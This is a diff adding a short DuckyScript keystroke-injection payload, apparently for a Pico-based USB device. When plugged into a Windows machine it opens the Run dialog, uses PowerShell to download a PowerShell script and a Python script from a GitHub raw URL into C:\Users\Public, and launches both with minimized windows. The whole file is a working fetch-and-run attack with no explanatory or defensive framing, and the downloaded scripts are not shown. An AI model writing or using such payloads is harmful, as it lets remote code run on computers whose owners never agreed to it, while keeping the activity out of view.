@@ -1,0 +1,23 @@
+DELAY 1000
+GUI R
+DELAY 500
+STRING powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/Deskduck.ps1" -OutFile "C:\Users\Public\Deskduck.ps1"
+ENTER
+DELAY 4000
+GUI R
+DELAY 500
+STRING powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/mousemover.py" -OutFile "C:\Users\Public\mousemover.py"
+DELAY 500
+ENTER
+DELAY 2000
+GUI R
+DELAY 1000
+STRING powershell Start-Process powershell -ArgumentList "C:\Users\Public\Deskduck.ps1" -WindowStyle Minimized
+DELAY 500
+ENTER
+DELAY 1000
+GUI R
+DELAY 1000
+STRING powershell Start-Process python3 -ArgumentList "C:\Users\Public\mousemover.py" -WindowStyle Minimized
+DELAY 500
+ENTER
